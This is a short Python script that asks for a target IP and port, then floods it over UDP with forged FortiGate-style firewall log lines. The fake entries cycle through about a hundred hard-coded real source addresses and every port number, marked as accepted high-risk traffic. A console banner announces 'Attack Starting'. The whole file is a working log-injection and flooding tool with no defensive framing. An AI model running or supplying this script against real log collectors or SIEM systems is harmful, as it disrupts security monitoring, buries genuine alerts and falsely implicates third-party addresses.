import sys
import os
import time
import socket
import random

src_ip = ["131.253.18.12","187.20.38.214","217.147.169.242","91.200.14.139","217.23.5.57","5.254.98.54","5.61.39.14","50.17.189.198","50.21.187.135","50.22.86.10","50.23.98.194","50.62.235.1","50.62.31.207","50.63.56.47","50.87.146.115","50.87.151.146","50.87.153.96","50.87.18.127","50.87.72.219","50.97.234.2","52.10.128.168","52.207.234.89","54.209.159.227","54.218.45.67","54.228.191.94","54.236.134.245","54.239.172.114","54.248.126.242","54.72.9.51","58.215.169.42","58.215.240.96","58.55.127.16","59.32.213.195","60.250.76.52","61.139.126.15","61.147.75.89","61.158.145.141","61.178.85.177","61.19.251.27","61.57.227.5","41.207.222.252","101.0.89.3","101.200.81.187","103.19.89.118","103.230.84.239","103.241.0.100","103.26.128.84","103.4.52.150","103.7.59.135","107.191.46.4","109.127.8.242","109.229.210.250","109.229.36.65","113.29.230.24","116.193.77.118","120.25.63.2","120.31.134.133","120.63.157.195","123.30.129.179","124.110.195.160","128.210.157.251","149.202.242.81","151.80.52.45","151.80.52.47","151.97.190.239","157.7.170.62","160.97.52.229","162.223.94.56","177.4.23.159","180.182.234.200","185.25.117.49","185.25.119.84","185.35.138.22","185.62.188.51","185.99.133.163","186.64.120.104","187.174.252.247","188.219.154.228","188.226.141.142","188.241.140.212","188.241.140.222","188.241.140.224","188.247.135.53","188.247.135.58","188.247.135.74","188.247.135.99","190.123.35.140","190.123.35.141","190.128.29.1","190.15.192.25","192.64.11.244","192.99.148.26","192.99.19.4","193.107.17.145","193.107.17.55","193.107.17.56","193.107.19.24","193.107.19.244","193.146.210.69","193.189.117.56","193.201.227.142","194.109.64.131","194.58.103.199","194.58.56.45","195.20.40.123","195.20.41.233","195.20.42.1","195.20.44.100","195.20.44.109","195.20.46.116","198.245.202.92","199.187.129.193"]

from datetime import datetime
now = datetime.now()
hour = now.hour
second = now.second
minute = now.minute
day = now.day
month = now.month
year = now.year

ip = input("IP Target: ")
port = input("Port: ")
bytes = str(random.randint(1000, 1490))
UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
date = str(year)+"-"+str(month)+"-"+str(day)
times = str(hour)+":"+str(minute)+":"+str(second)
srcport = str(random.randint(1, 65535))
sent = 0
addr = (ip,int(port))

datalog = "date="+date+" "+"time="+times+" devname=ragnar-gw devid=FG100D3G16805066 logid=0001000014 type=traffic subtype=local level=notice vd=root eventtime=1588606014680296800 tz=+0700 srcip=203.151.205.146 srcport=50278 srcintf=wan1 srcintfrole=undefined"+" dstip="+ip+" dstport=20514 dstintf=root dstintfrole=undefined sessionid=29280782 proto=17 action=deny policyid=0 policytype=local-in-policy service=udp/20514 dstcountry=Thailand srccountry=Thailand trandisp=noop app=udp/20514 duration=0 sentbyte=0 rcvdbyte=0 sentpkt=0 appcat=unscanned crscore=5 craction=262144 crlevel=low"
os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0%")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

for i in list(src_ip):
	for n in range (1,65535):
		date = str(year)+"-"+str(month)+"-"+str(day)
		times = str(hour)+":"+str(minute)+":"+str(second)
		bytes = str(random.randint(1000, 2000))
		sent = sent + 1
		srcport = str(random.randint(1, 65535))
		datalog = "date="+date+" "+"time="+times+" devname=ragnar-gw devid=FG100D3G16805066 logid=0001000014 type=traffic subtype=local level=notice vd=root eventtime=1588606014680296800 tz=+0700 srcip="+i+" srcport="+srcport+" srcintf=wan1 srcintfrole=undefined"+" dstip="+ip+" dstport="+str(n)+" dstintf=root dstintfrole=undefined sessionid=29280782 proto=17 action=accept policyid=0 policytype=local-in-policy service=udp/"+str(n)+" dstcountry=Thailand srccountry=Thailand trandisp=noop app=udp/"+str(n)+" duration=0 sentbyte=0 rcvdbyte="+str(bytes)+" sentpkt=0 appcat=unscanned crscore=5 craction=262144 crlevel=high"
		bytesToSend = str.encode(datalog)
		#print(datalog)
		UDPClientSocket.sendto(bytesToSend, addr)
		print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))